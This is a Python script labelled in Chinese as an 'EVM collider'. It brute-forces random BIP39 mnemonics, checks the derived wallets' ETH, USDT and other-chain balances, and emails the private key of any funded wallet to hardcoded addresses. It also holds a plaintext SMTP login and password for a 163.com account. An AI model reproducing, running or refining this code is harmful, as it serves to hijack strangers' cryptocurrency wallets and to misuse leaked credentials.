# -*- coding: utf-8 -*-

import random, json
from email.mime.text import MIMEText
from email.header import Header
import smtplib
import os, threading
from bip39 import INDEX_TO_WORD_TABLE as bip39_words
from model.wallet_evm import mnemonic_to_all
from web3 import Web3
from loguru import logger
from datetime import datetime

# process = int(input("输入执行进程数:"))

rpc = {
    "eth_rpc" : ["https://eth.public-rpc.com"],
    "bsc_rpc" : ["https://bscrpc.com"],
    "arb_rpc" : ["https://arbitrum.public-rpc.com"],
    "op_rpc" : ["https://optimism-mainnet.core.chainstack.com/b5f834546042e096d5941131a72726fe"],
    "poly_rpc" : ["https://polygon-rpc.com"],
    "avax_rpc" : ["https://avalanche.public-rpc.com"],
    "scroll_rpc": ["https://arbitrum.public-rpc.com"],
}

def send_email(msg: str, recever="164093410@qq.com"):
    message = MIMEText(msg, _subtype='plain', _charset='utf-8')
    message['From'] = "buchang_123@163.com"
    message['To'] = f"<591547726@qq.com>"
    message['Subject'] = Header(f'EVM碰撞器', 'utf-8')
    smtper = smtplib.SMTP_SSL("smtp.163.com", 465)
    smtper.login("buchang_123@163.com", "PMFHEFUVASHUISBQ")
    smtper.sendmail("buchang_123@163.com", recever, message.as_string())


def demo_log():
    log_name = datetime.now().strftime("%Y-%m-%d")
    sink = os.path.join("./", "{}.log".format(log_name))
    level = "DEBUG"
    encoding = "utf-8"
    enqueue = True
    rotation = "500MB"
    retention = "1 week"
    logger.add(
        sink=sink, level=level,
        format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <white>{message}</white>",
        encoding=encoding, enqueue=enqueue,
        rotation=rotation, retention=retention,
    )
    return logger

# 生成账户信息
def get_account():
    mnemonic = ' '.join(list(random.sample(bip39_words, 12)))
    private_key, public_key, address = mnemonic_to_all(mnemonic=mnemonic)
    log = demo_log()
    log.info(private_key, public_key, address)
    return private_key, public_key, address

# 验证ETH链账户余额
def check_eth_balance_byprivate(private_key):
    log = demo_log()
    try:
        web3 = Web3(Web3.HTTPProvider(rpc["eth_rpc"][0]))
        if not web3.is_connected():
            print("RPC连接失败", "https://eth.public-rpc.com")
            return False
        wallet_account = web3.eth.account.from_key(private_key)
        wallet_address = Web3.to_checksum_address(wallet_account.address)
        eth_balance = web3.from_wei(
            web3.eth.get_balance(Web3.to_checksum_address(wallet_address)), "ether"
        )
        eth_usdt_contract = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
        contract_source_code = '''    [{
            "type":"function",
            "name":"balanceOf",
            "constant":true,
            "payable":false,
            "inputs":[{"name":"","type":"address"}],
            "outputs":[{"name":"","type":"uint256","value":"0"}]
            }]
        '''
        abi = json.loads(contract_source_code)
        source_code = web3.eth.get_code(eth_usdt_contract)
        contract = web3.eth.contract(abi=abi, address=eth_usdt_contract, bytecode=source_code)
        usdt_balance = contract.functions.balanceOf(wallet_address).call()
        print(private_key, "\t", eth_balance, "\t",usdt_balance)
        if eth_balance > 0 or usdt_balance > 0:
            msg = "\n私钥:" + str(private_key) + "\n地址:" + str(wallet_address) + "\nETH余额:" + str(eth_balance) + "\nUSDT余额:" + str(usdt_balance)
            send_email(msg)
            log.success(private_key, "ETH Chain")
        return True
    except Exception as e:
        print(e, private_key, "ETH Chain")
        return False

# 验证其他公链账户余额
def check_other_balance_byaddress(wallet_address, chain_rpc=rpc["bsc_rpc"][0]):
    log = demo_log()
    try:
        w3_rpc = Web3(Web3.HTTPProvider(chain_rpc))
        if not w3_rpc.is_connected():
            print("RPC连接失败", chain_rpc)
            return False
        balance_data = w3_rpc.eth.get_balance(wallet_address)
        balance = w3_rpc.from_wei(balance_data, "ether")
        print(wallet_address, chain_rpc, balance)
        if float(balance)>0:
            msg = "\n地址:" + str(wallet_address) + "\n网络:" + str(chain_rpc)
            send_email(msg)
            log.success(wallet_address, chain_rpc)
        return True
    except Exception as e:
        print(e, wallet_address)
        return False












